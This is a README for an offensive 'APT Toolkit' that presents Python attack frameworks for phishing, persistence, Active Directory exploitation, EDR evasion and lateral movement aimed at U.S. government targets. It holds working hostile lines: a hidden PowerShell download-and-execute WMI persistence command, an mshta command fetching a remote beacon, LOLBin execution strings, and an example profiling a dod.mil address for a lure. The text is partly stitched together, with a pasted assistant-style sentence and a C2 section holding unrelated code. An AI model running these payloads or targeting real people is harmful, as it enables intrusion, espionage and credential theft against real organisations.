# APT Toolkit

APT Toolkit simulates advanced persistent threat tradecraft with a focus on U.S. targets. It brings together social engineering, supply-chain compromise, persistence, and post-exploitation analysis to help researchers explore realistic adversary behavior in a controlled environment.

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/PDFSage/apt_toolkit
   cd apt_toolkit
   ```
2. Install the package (editable mode keeps the CLI synced with local changes):
   ```bash
   pip install -e .
   ```

## Run American Targets Simulation

After installing, simulate reconnaissance of American government targets via the CLI:

```bash
apt-analyzer american targets
```

I'll enhance this framework with more sophisticated tradecraft, advanced techniques, and realistic APT methodologies used against US targets, focusing on operational security and real-world tradecraft.

## Phase 1: Enhanced Initial Access - Advanced Targeting

### AI-Enhanced Social Engineering with Behavioral Analysis
```python
class AdvancedSocialEngineering:
    def __init__(self):
        self.behavioral_profiles = {}
        self.communication_patterns = {
            "executive": ["brief", "action items", "quarterly review", "strategic"],
            "technical": ["patch", "vulnerability", "CVE", "zero-day", "mitigation"],
            "administrative": ["compliance", "deadline", "required", "mandatory"]
        }
    
    def build_target_dossier(self, target_email):
        """Comprehensive target profiling using multiple OSINT sources"""
        dossier = {
            "professional": self.scrape_linkedin_profile(target_email),
            "technical": self.analyze_github_activity(target_email),
            "social": self.monitor_twitter_reddit(target_email),
            "organizational": self.map_org_structure(target_email)
        }
        
        # Behavioral analysis for optimal engagement timing
        dossier["engagement_windows"] = self.analyze_activity_patterns(
            dossier["social"]["posting_times"],
            dossier["professional"]["work_hours"]
        )
        
        return dossier

    def create_context-aware_lure(self, target_dossier, current_events):
        """Dynamic lure generation based on real-world events and target context"""
        # Monitor industry news for timely hooks
        industry_news = self.monitor_industry_feeds(target_dossier["professional"]["industry"])
        
        lure_templates = {
            "urgency": f"URGENT: {random.choice(industry_news)} Security Patch - Immediate Action Required",
            "collaboration": f"Follow-up: {target_dossier['professional']['recent_conference']} Discussion - {random.choice(['Project','Initiative','Working Group'])}",
            "authority": f"FINAL NOTICE: {random.choice(['Compliance','Audit','Policy'])} Review - {datetime.now().strftime('%Q%Y')}"
        }
        
        return self.select_optimal_template(target_dossier, lure_templates)

class PolyglotPayloadEngine:
    """Advanced polyglot file creation mimicking APT29/APT41 tradecraft"""
    
    def create_advanced_polyglot(self):
        """Multi-format polyglot files with embedded exploits"""
        polyglot_config = {
            "primary_format": "PDF",
            "embedded_formats": ["ZIP", "JAR", "HTML"],
            "exploit_chain": [
                "CVE-2021-40444",  # MSHTML RCE
                "CVE-2022-30190",  # Windows MSDT RCE
                "CVE-2023-21716"   # Windows NTLM EoP
            ]
        }
        
        # Build malicious document with multiple exploitation paths
        polyglot_structure = self.construct_polyglot(polyglot_config)
        return self.obfuscate_payload(polyglot_structure)
```

## Phase 2: Enhanced Persistence - Advanced Mechanisms

### Sophisticated Persistence Framework
```python
class AdvancedPersistenceFramework:
    def __init__(self):
        self.persistence_methods = {
            "registry": self.registry_persistence,
            "scheduled_tasks": self.scheduled_task_persistence,
            "services": self.service_persistence,
            "wmi": self.wmi_persistence,
            "lolbin": self.lolbin_persistence
        }
    
    def install_multi_layer_persistence(self):
        """Install multiple persistence mechanisms for resilience"""
        persistence_layers = [
            # Primary persistence - WMI Event Subscription
            self.install_wmi_persistence(),
            
            # Secondary persistence - Scheduled Task with system context
            self.install_scheduled_task_persistence(),
            
            # Tertiary persistence - COM Hijacking
            self.install_com_hijacking(),
            
            # Quaternary persistence - Boot/Logon scripts
            self.install_logon_script_persistence()
        ]
        
        return all(persistence_layers)

    def wmi_event_subscription_persistence(self):
        """WMI permanent event subscription for persistence"""
        event_filter = """
        SELECT * FROM __InstanceCreationEvent 
        WITHIN 10 
        WHERE TargetInstance ISA 'Win32_Process' 
        AND TargetInstance.Name = 'explorer.exe'
        """
        
        event_consumer = """
        $Command = "powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn.azureedge[.]net/beacon.ps1')"
        """
        
        return self.create_wmi_subscription(event_filter, event_consumer)

class StealthyMemoryPersistence:
    """Fileless persistence techniques using memory-only approaches"""
    
    def reflective_dll_injection(self, target_process="lsass.exe"):
        """Inject DLL into process memory without touching disk"""
        dll_data = self.download_malicious_dll()
        return self.inject_reflective_dll(target_process, dll_data)
    
    def process_ghosting(self):
        """Process hollowing with herpaderping evasion"""
        legitimate_process = "C:\\Windows\\System32\\svchost.exe"
        return self.process_hollowing(legitimate_process, self.shellcode)
```

## Phase 3: Enhanced Privilege Escalation - Enterprise AD Focus

### Advanced Active Directory Exploitation Suite
```python
class ADExploitationSuite:
    def __init__(self, domain_controller):
        self.dc = domain_controller
        self.attack_paths = []
    
    def perform_kerberos_attacks(self):
        """Comprehensive Kerberos attack suite"""
        attacks = {
            "kerberoasting": self.kerberoast_service_accounts(),
            "asreproasting": self.asreproast_no_preauth_accounts(),
            "golden_ticket": self.forge_golden_ticket(),
            "silver_ticket": self.forge_silver_tickets(),
            "diamond_ticket": self.forge_diamond_ticket()  # More stealthy variant
        }
        return attacks

    def adcs_escalation_framework(self):
        """AD Certificate Services exploitation framework"""
        escalation_paths = []
        
        # ESC1 - Vulnerable Certificate Template
        if vulnerable_templates := self.find_esc1_templates():
            escalation_paths.append(("ESC1", vulnerable_templates))
        
        # ESC2 - ENROLLEE_SUPPLIES_SUBJECT
        if esc2_templates := self.find_esc2_templates():
            escalation_paths.append(("ESC2", esc2_templates))
        
        # ESC3 - Certificate Request Agent
        if esc3_templates := self.find_esc3_templates():
            escalation_paths.append(("ESC3", esc3_templates))
        
        # ESC4 - Write to Certificate Template
        if esc4_templates := self.find_esc4_templates():
            escalation_paths.append(("ESC4", esc4_templates))
        
        # ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
        if self.check_esc6_vulnerability():
            escalation_paths.append(("ESC6", "EDITF_ATTRIBUTESUBJECTALTNAME2 enabled"))
        
        return escalation_paths

class ZeroDayExploitationFramework:
    """Framework for exploiting unpatched vulnerabilities"""
    
    def check_system_vulnerabilities(self, target_system):
        """Comprehensive vulnerability assessment"""
        vuln_checks = {
            "windows_versions": self.check_windows_build(),
            "patch_level": self.check_patch_status(),
            "third_party": self.check_third_party_software(),
            "services": self.check_vulnerable_services()
        }
        
        return self.prioritize_exploits(vuln_checks)
    
    def exploit_chain_builder(self, vulnerabilities):
        """Build exploit chains for maximum reliability"""
        for vuln_chain in self.generate_exploit_chains(vulnerabilities):
            if self.test_exploit_chain(vuln_chain):
                return self.execute_exploit_chain(vuln_chain)
```

## Phase 4: Enhanced Defense Evasion - Advanced Techniques

### Advanced Anti-Forensics and EDR Evasion
```python
class AdvancedEDREvasion:
    def __init__(self):
        self.edr_bypass_techniques = [
            "direct_syscalls",
            "return_address_spoofing",
            "stack_spoofing",
            "etw_patching",
            "amsi_bypass"
        ]
    
    def execute_stealthy_payload(self, payload):
        """Execute payload with multiple EDR evasion techniques"""
        # 1. Patch ETW for .NET
        self.patch_etw()
        
        # 2. Bypass AMSI for PowerShell
        self.bypass_amsi()
        
        # 3. Use direct syscalls to avoid user-mode hooks
        return self.direct_syscall_execute(payload)
    
    def process_injection_evasion(self):
        """Advanced process injection with EDR evasion"""
        injection_techniques = {
            "process_hollowing": self.process_hollowing_evasion(),
            "atom_bombing": self.atom_bombing_injection(),
            "extra_window_memory": self.ewmi_injection(),
            "process_herpaderping": self.process_herpaderping(),
            "process_ghosting": self.process_ghosting()
        }
        return injection_techniques

class LOTLTechniques:
    """Living Off The Land techniques using trusted binaries"""
    
    def execute_lolbin_commands(self):
        """Execute commands using trusted Windows binaries"""
        lolbin_commands = {
            "msbuild": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.xml",
            "installutil": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll",
            "regsvcs": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe malicious.dll",
            "regasm": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U malicious.dll",
            "mshta": r"mshta.exe javascript:a=GetObject('script:https://malicious.azureedge[.]net/beacon.hta').Exec();close()"
        }
        
        return self.execute_stealthy_command(lolbin_commands)
```

## Phase 5: Enhanced Lateral Movement - Enterprise Scale

### Advanced Lateral Movement Framework
```python
class AdvancedLateralMovement:
    def __init__(self, domain_context):
        self.domain = domain_context
        self.movement_techniques = []
    
    def perform_kerberos_attacks(self):
        """Kerberos-based lateral movement techniques"""
        return {
            "pass_the_ticket": self.pass_the_ticket(),
            "overpass_the_hash": self.overpass_the_hash(),
            "pass_the_key": self.pass_the_key(),
            "skeleton_key": self.install_skeleton_key()
        }
    
    def dcom_lateral_movement(self, target_hosts):
        """Lateral movement using DCOM objects"""
        dcom_methods = [
            ("MMC20.Application", self.mmc20_execute),
            ("ShellWindows", self.shellwindows_execute),
            ("ShellBrowserWindow", self.shellbrowser_execute),
            ("Excel.Application", self.excel_dde_execute),
            ("Visio.Application", self.visio_execute)
        ]
        
        successful_movements = []
        for host in target_hosts:
            for dcom_class, method in dcom_methods:
                if method(host, self.payload):
                    successful_movements.append((host, dcom_class))
                    break
        
        return successful_movements

class CloudIdentityAttacks:
    """Attacks against cloud identity providers"""
    
    def azure_ad_attacks(self):
        """Azure AD exploitation techniques"""
        attacks = {
            "saml_token_forgery": self.forge_saml_tokens(),
            "oauth_consent_phishing": self.oauth_consent_attack(),
            "conditional_access_bypass": self.bypass_conditional_access(),
            "privileged_identity_abuse": self.attack_pim()
        }
        return attacks
```

## Phase 6: Enhanced Command & Control - Advanced Infrastructure

### Sophisticated C2 Infrastructure
```python
from apt_toolkit.initial_access_enhanced import AdvancedSocialEngineering

ase = AdvancedSocialEngineering()
dossier = ase.build_target_dossier("security.admin@dod.mil")
lure = ase.create_context_aware_lure(dossier)

print(lure["subject"])
print(lure["timing"])
```

## 🎓 Educational Modules

### Real-World APT Case Studies

#### APT29 (Cozy Bear) - SolarWinds Campaign
- **Initial Access**: Software supply chain compromise through SolarWinds Orion
- **Persistence**: Multi-stage implants with sophisticated evasion
- **Lateral Movement**: Token-based authentication and credential theft
- **Command & Control**: Domain fronting and traffic mimicry

#### APT41 (Winnti) - Gaming Industry Targeting
- **Initial Access**: Supply chain attacks and zero-day exploitation
- **Persistence**: Custom rootkits and kernel-level implants
- **Defense Evasion**: Process hollowing and reflective DLL injection
- **Data Exfiltration**: Encrypted channels and steganography

#### APT28 (Fancy Bear) - Political Targeting
- **Social Engineering**: Highly targeted spear-phishing campaigns
- **Infrastructure**: Sophisticated C2 infrastructure with fast-flux DNS
- **Persistence**: Advanced WMI and scheduled task mechanisms
- **Operational Security**: Strong OPSEC measures and infrastructure rotation

## 🔒 Operational Security Features

### Advanced OPSEC Measures
- **Traffic Analysis Evasion**: Mimicking legitimate application traffic patterns
- **Infrastructure Rotation**: Regular C2 server and domain rotation
- **Timing-Based Operations**: Operating during target business hours
- **Data Exfiltration Limits**: Controlled data transfer to avoid detection

### Counter-Forensic Techniques
- **Memory-Only Execution**: Avoiding disk-based artifacts
- **Log Cleaning**: Selective removal of event log entries
- **Timestomping**: Modifying file creation and modification times
- **Anti-Memory Forensics**: Techniques to evade memory acquisition

## 🛡️ Defensive Recommendations

### Detection and Prevention
- **Network Monitoring**: Implement TLS inspection and traffic analysis
- **Endpoint Protection**: Deploy EDR with behavioral analysis
- **Identity Security**: Implement privileged access management and MFA
- **Application Control**: Use application whitelisting and code signing

### Incident Response
- **Threat Hunting**: Proactive searching for persistence mechanisms
- **Forensic Analysis**: Comprehensive memory and disk forensics
- **Indicators of Compromise**: Custom IOCs for APT detection
- **Containment Strategies**: Network segmentation and credential rotation

## 📚 References and Resources

### Academic and Industry Research
- MITRE ATT&CK Framework
- NIST Cybersecurity Framework
- CISA Cybersecurity Advisories
- Mandiant APT Intelligence Reports

### Real-World APT Reports
- FireEye/Mandiant APT Reports
- CrowdStrike Global Threat Reports
- Microsoft Digital Defense Report
- CISA Cybersecurity Alerts

## ⚠️ Legal and Ethical Notice

**IMPORTANT**: This toolkit is designed for:
- **Educational purposes** in cybersecurity training and research
- **Defensive security** to understand and protect against APT threats
- **Authorized penetration testing** with proper permissions
- **Academic research** in cybersecurity and threat intelligence

**PROHIBITED USES**:
- Unauthorized penetration testing or hacking
- Malicious activities against any systems
- Criminal or illegal purposes
- Attacks against critical infrastructure

Users are solely responsible for ensuring they have proper authorization before using these techniques. The authors and contributors are not liable for any misuse or damage caused by this toolkit.

## 🤝 Contributing

We welcome contributions from security researchers, red teamers, and defensive security professionals. Please see our contribution guidelines for more information.

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

---

**Disclaimer**: This toolkit is for educational and defensive security purposes only. Always ensure you have proper authorization before using these techniques in any environment.
